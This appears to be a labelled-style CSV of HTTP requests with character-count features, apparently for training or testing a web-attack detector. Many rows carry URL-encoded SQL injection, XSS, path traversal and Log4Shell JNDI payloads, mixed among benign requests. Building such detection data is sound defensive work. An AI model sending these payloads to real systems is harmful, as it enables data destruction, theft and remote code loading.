method,path,body,single_q,double_q,dashes,braces,spaces,badwords
GET,/forum/post?id=1,,0,0,0,0,0,0
POST,/crypto/market,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/library,,0,0,0,0,0,0
GET,/user/cart/add?id=45,,0,0,0,0,0,0
GET,/search?q=laptops?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
POST,/support/chat,,0,0,0,0,0,0
POST,/playlists,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/locations/europe,,0,0,0,0,0,0
POST,/api/v2/checkout,uemail=test@example.com,0,0,0,0,0,0
GET,/forum/category/tech,,0,0,0,0,0,0
GET,/settings,,0,0,0,0,0,0
POST,/docs/api,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/organization,product=123&type=info,0,0,0,0,0,0
GET,/billing/payment-methods,,0,0,0,0,0,0
POST,/contact.html,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/category/sports?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/store/apply-coupon?code=NEW50?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
POST,/services.php,product=123&type=info,0,0,0,0,0,0
POST,/products.html?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/movies,comment=Nice+product,0,0,0,0,1,0
GET,/travel/offers?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/orders/detail?id=100?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/docs/api,,0,0,0,0,0,0
GET,/books/read?id=100,,0,0,0,0,0,0
GET,/api/v2/login,,0,0,0,0,0,0
GET,/subscribe,,0,0,0,0,0,0
GET,/promo,,0,0,0,0,0,0
GET,/restaurants?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/gallery,,0,0,0,0,0,0
GET,/products/filter?cat=men,,0,0,0,0,0,0
GET,/page/2,,0,0,0,0,0,0
POST,/assets/images/logo.png,id=55,0,0,0,0,0,0
POST,/settings/billing,,0,0,0,0,0,0
POST,/auth/login?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/weather/city?name=Delhi?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
POST,/contact.html?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
GET,/blog/post1,,0,0,0,0,0,0
POST,/languages/hindi?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
GET,/travel/hotels?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
POST,/offers/today?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/movies,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/weather/today,,0,0,0,0,0,0
GET,/languages/english,,0,0,0,0,0,0
GET,/forum,,0,0,0,0,0,0
POST,/orders/detail?id=100,id=55,0,0,0,0,0,0
POST,/languages,id=55,0,0,0,0,0,0
GET,/user/profile?id=3,,0,0,0,0,0,0
POST,/static/script.js?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,1
POST,/products/new,id=55,0,0,0,0,0,0
POST,/static/style.css,comment=Nice+product,0,0,0,0,1,0
POST,/api/v1/users,comment=Nice+product,0,0,0,0,1,0
GET,/orders/detail?id=100,,0,0,0,0,0,0
POST,/search?page=1,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/user/cart,,0,0,0,0,0,0
GET,/assets/images/logo.png,,0,0,0,0,0,0
POST,/user/cart?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
POST,/languages/hindi,uemail=test@example.com,0,0,0,0,0,0
GET,/products,,0,0,0,0,0,0
POST,/news/latest,,0,0,0,0,0,0
GET,/locations/europe,,0,0,0,0,0,0
POST,/travel/flights,uname=test&pass=test,0,0,0,0,0,0
POST,/analytics/traffic,product=123&type=info,0,0,0,0,0,0
GET,/search?page=1,,0,0,0,0,0,0
POST,/partners/apply?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
POST,/offers/today,,0,0,0,0,0,0
GET,/contact.html,,0,0,0,0,0,0
POST,/user/messages?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
POST,/auth/logout,uname=test&pass=test,0,0,0,0,0,0
POST,/auth/register,uname=test&pass=test,0,0,0,0,0,0
GET,/sports/cricket,,0,0,0,0,0,0
POST,/movies/popular?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/sports/cricket?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/api/v3/dashboard,id=55,0,0,0,0,0,0
GET,/products/trending,,0,0,0,0,0,0
POST,/university/course?id=20,,0,0,0,0,0,0
POST,/checkout,,0,0,0,0,0,0
POST,/reviews/post?id=29,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/auth/logout,,0,0,0,0,0,0
GET,/products/view?id=2?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/products/filter?price=high?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/subscriptions,,0,0,0,0,0,1
GET,/blog/post1,,0,0,0,0,0,0
GET,/search?cat=fashion,,0,0,0,0,0,0
POST,/search?q=mobiles?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
POST,/forum/post?id=2?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
POST,/products?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/blog/category/tech,,0,0,0,0,0,0
POST,/blog/post2,product=123&type=info,0,0,0,0,0,0
POST,/api/v2/login,,0,0,0,0,0,0
GET,/weather/city?name=Delhi?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/category/fashion,,0,0,0,0,0,0
GET,/promo/winter,,0,0,0,0,0,0
POST,/newsfeed,comment=Nice+product,0,0,0,0,1,0
GET,/restaurants,,0,0,0,0,0,0
GET,/offers,,0,0,0,0,0,0
GET,/offers,,0,0,0,0,0,0
GET,/assets/images/banner.jpg,,0,0,0,0,0,0
GET,/page/4,,0,0,0,0,0,0
POST,/support/ticket,uemail=test@example.com,0,0,0,0,0,0
GET,/settings/preferences,,0,0,0,0,0,0
GET,/account/security,,0,0,0,0,0,0
GET,/support/ticket?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/index.html,,0,0,0,0,0,0
POST,/help/faq,id=55,0,0,0,0,0,0
GET,/store/checkout,,0,0,0,0,0,0
GET,/products/related?id=10,,0,0,0,0,0,0
GET,/help/contact,,0,0,0,0,0,0
GET,/notifications/settings,,0,0,0,0,0,0
GET,/inbox/messages,,0,0,0,0,0,0
POST,/docs/examples?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
GET,/events/past?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/careers,uemail=test@example.com,0,0,0,0,0,0
POST,/products/trending,uname=test&pass=test,0,0,0,0,0,0
POST,/locations/europe,id=55,0,0,0,0,0,0
POST,/api/v2/auth?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
GET,/news,,0,0,0,0,0,0
POST,/admin/reports?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/forum/post?id=1?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/search?page=2?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/offers,,0,0,0,0,0,0
POST,/user/cart/add?id=45,uname=test&pass=test,0,0,0,0,0,0
POST,/forum/post?id=1,uemail=test@example.com,0,0,0,0,0,0
POST,/promo,,0,0,0,0,0,0
POST,/organization/about?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/admin/users,,0,0,0,0,0,0
POST,/settings/billing,,0,0,0,0,0,0
GET,/movies/details?id=9,,0,0,0,0,0,0
GET,/university/courses,,0,0,0,0,0,0
POST,/products/filter?price=high,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/assets/images/logo.png,uname=test&pass=test,0,0,0,0,0,0
GET,/books/bestsellers?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
GET,/music/playlist?id=4?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
POST,/support?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
POST,/organization/about,comment=Nice+product,0,0,0,0,1,0
POST,/docs?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
GET,/api/v1/items,,0,0,0,0,0,0
POST,/locations/india,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/products/list,product=123&type=info,0,0,0,0,0,0
GET,/static/style.css,,0,0,0,0,0,0
GET,/category/sports,,0,0,0,0,0,0
GET,/offers/today?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/languages,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/projects,,0,0,0,0,0,0
GET,/university/course?id=20?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/dashboard?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/books/bestsellers,uemail=test@example.com,0,0,0,0,0,0
GET,/restaurants/view?id=23?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
GET,/library/book?id=10,,0,0,0,0,0,0
POST,/search?q=shoes,uemail=test@example.com,0,0,0,0,0,0
POST,/stocks?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/forum/post?id=1,id=55,0,0,0,0,0,0
POST,/locations/india,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/appointments/book?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
GET,/feedback/form?q=sleep%285%29,,0,0,0,1,0,2
GET,/partners/login,,0,0,0,0,0,0
GET,/user/orders,,0,0,0,0,0,0
GET,/forum/category/general,,0,0,0,0,0,0
GET,/api/v2/register?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/docs/examples?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/news/trending,,0,0,0,0,0,0
POST,/feedback?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/category/sports,uemail=test@example.com,0,0,0,0,0,0
POST,/stocks,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/organization/about,uname=test&pass=test,0,0,0,0,0,0
GET,/settings/billing?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
GET,/api/v2/login?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/contact.php,,0,0,0,0,0,0
GET,/account,,0,0,0,0,0,0
POST,/partners/apply?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
POST,/api/v2/register?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
GET,/orders?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/account,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/movies/details?id=9,,0,0,0,0,0,0
POST,/store?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/search?page=3?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
POST,/orders,comment=Nice+product,0,0,0,0,1,0
GET,/languages/english,,0,0,0,0,0,0
POST,/admin/logs,,0,0,0,0,0,0
POST,/blog/post2,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/user/profile?id=2?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/auth/verify-email?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/api/v3/notifications?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/blog/category/security,,0,0,0,0,0,0
GET,/dashboard?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
POST,/api/v1/categories,,0,0,0,0,0,0
GET,/news/business?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/forum/category/general?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
POST,/projects?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/unsubscribe,,0,0,0,0,0,0
POST,/sports,comment=Nice+product,0,0,0,0,1,0
GET,/auth/register,,0,0,0,0,0,0
POST,/weather/today,comment=Nice+product,0,0,0,0,1,0
POST,/organization/about,uemail=test@example.com,0,0,0,0,0,0
GET,/docs/examples?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/api/v1/users,,0,0,0,0,0,0
GET,/billing,,0,0,0,0,0,0
GET,/downloads/pdf?id=1?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
POST,/index.php,uname=test&pass=test,0,0,0,0,0,0
GET,/music/playlist?id=4?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/user/wishlist/add?id=98,comment=Nice+product,0,0,0,0,1,0
GET,/api/v3/messages,,0,0,0,0,0,0
POST,/languages,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/notifications/settings,,0,0,0,0,0,0
POST,/products/filter?cat=men,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/static/script.js,,0,0,0,0,0,1
GET,/api/v2/checkout,,0,0,0,0,0,0
POST,/help/faq,comment=Nice+product,0,0,0,0,1,0
GET,/newsfeed/today?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/api/v1/orders,,0,0,0,0,0,0
POST,/search?page=2?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/travel/flights,,0,0,0,0,0,0
GET,/api/v3/messages,,0,0,0,0,0,0
GET,/settings/profile?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/forum/post?id=3,,0,0,0,0,0,0
POST,/analytics/traffic?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
POST,/gallery/videos,uname=test&pass=test,0,0,0,0,0,0
POST,/blog/category/tech,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/offers,uname=test&pass=test,0,0,0,0,0,0
GET,/newsfeed,,0,0,0,0,0,0
GET,/playlists/mixes,,0,0,0,0,0,0
GET,/gallery/videos?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/sports,,0,0,0,0,0,0
GET,/billing/history,,0,0,0,0,0,0
POST,/category/sports?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/user,,0,0,0,0,0,0
GET,/billing,,0,0,0,0,0,0
POST,/page/3?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/restaurants/nearby,,0,0,0,0,0,0
GET,/gallery,,0,0,0,0,0,0
GET,/gallery/photos?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
POST,/admin/reports,uname=test&pass=test,0,0,0,0,0,0
POST,/subscriptions/manage,product=123&type=info,0,0,0,0,0,1
POST,/weather/city?name=Delhi?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
GET,/admin/users,,0,0,0,0,0,0
GET,/api/v2/orders,,0,0,0,0,0,0
GET,/home.php,,0,0,0,0,0,0
GET,/api/v1/orders?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/locations/europe,,0,0,0,0,0,0
GET,/assets/images/banner.jpg,,0,0,0,0,0,0
POST,/category/home-appliances,,0,0,0,0,0,0
POST,/forum?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
GET,/store/phones?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/newsfeed,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/user/profile,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/books/read?id=100,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/reviews,,0,0,0,0,0,0
GET,/blog/category/security,,0,0,0,0,0,0
GET,/settings,,0,0,0,0,0,0
POST,/docs?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
GET,/sports/cricket,,0,0,0,0,0,0
POST,/api/v2/orders?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/checkout/payment,,0,0,0,0,0,0
POST,/products.html?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
POST,/products/trending,id=55,0,0,0,0,0,0
POST,/search?q=shoes?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/promo/winter?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
POST,/static/theme.css,product=123&type=info,0,0,0,0,0,0
GET,/sports,,0,0,0,0,0,0
POST,/products/filter?cat=men,product=123&type=info,0,0,0,0,0,0
POST,/user/settings,comment=Nice+product,0,0,0,0,1,0
GET,/orders/list,,0,0,0,0,0,0
GET,/static/style.css?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
GET,/checkout/address,,0,0,0,0,0,0
GET,/partners/login,,0,0,0,0,0,0
POST,/products/filter?cat=men?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/blog/post1?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
POST,/library/book?id=10,product=123&type=info,0,0,0,0,0,0
POST,/news/world,comment=Nice+product,0,0,0,0,1,0
GET,/shop?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/events/upcoming,,0,0,0,0,0,0
GET,/blog/post2,,0,0,0,0,0,0
GET,/forum/post?id=1?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
GET,/docs/api,,0,0,0,0,0,0
POST,/organization/about,uname=test&pass=test,0,0,0,0,0,0
GET,/playlists/mixes,,0,0,0,0,0,0
POST,/library?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/forum/threads?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/help/how-to-order,comment=Nice+product,0,0,0,0,1,0
GET,/restaurants/nearby,,0,0,0,0,0,0
POST,/languages/hindi,uname=test&pass=test,0,0,0,0,0,0
GET,/admin/settings?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
POST,/products/list,comment=Nice+product,0,0,0,0,1,0
GET,/events,,0,0,0,0,0,0
GET,/docs/api,,0,0,0,0,0,0
GET,/api/v2/orders?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
POST,/products/view?id=2?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/category/fashion,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/about.html,uemail=test@example.com,0,0,0,0,0,0
POST,/user/wishlist,id=55,0,0,0,0,0,0
POST,/weather/week?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
POST,/products/trending,comment=Nice+product,0,0,0,0,1,0
GET,/api/v3/dashboard?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/university/courses,,0,0,0,0,0,0
GET,/user?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/library/book?id=10,,0,0,0,0,0,0
POST,/locations/india,product=123&type=info,0,0,0,0,0,0
POST,/account,product=123&type=info,0,0,0,0,0,0
POST,/auth/verify-email,uemail=test@example.com,0,0,0,0,0,0
GET,/dashboard/overview?q=admin%27+--,,1,0,1,0,1,0
POST,/search?cat=fashion,id=55,0,0,0,0,0,0
GET,/user/profile?q=admin%27+--,,1,0,1,0,1,0
GET,/auth/login,,0,0,0,0,0,0
POST,/support?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/forum/threads?q=admin%27+--,,1,0,1,0,1,0
POST,/faq,,0,0,0,0,0,0
GET,/user/cart/add?id=45,,0,0,0,0,0,0
GET,/news,,0,0,0,0,0,0
GET,/help,,0,0,0,0,0,0
GET,/page/1,,0,0,0,0,0,0
POST,/tickets,uname=test&pass=test,0,0,0,0,0,0
GET,/offers/clearance,,0,0,0,0,0,0
POST,/feedback/form?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/downloads,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/page/4,,0,0,0,0,0,0
POST,/store/checkout,comment=Nice+product,0,0,0,0,1,0
POST,/search?q=mobiles,product=123&type=info,0,0,0,0,0,0
POST,/user/settings,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/feedback,,0,0,0,0,0,0
POST,/organization?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/admin/dashboard?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/languages/hindi?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/tickets/open?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
GET,/forum/category/coding,,0,0,0,0,0,0
GET,/appointments,,0,0,0,0,0,0
POST,/offers,comment=Nice+product,0,0,0,0,1,0
POST,/blog/category/security,uname=test&pass=test,0,0,0,0,0,0
POST,/gallery/videos,product=123&type=info,0,0,0,0,0,0
GET,/products/new?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/support/ticket,,0,0,0,0,0,0
POST,/checkout/payment,uname=test&pass=test,0,0,0,0,0,0
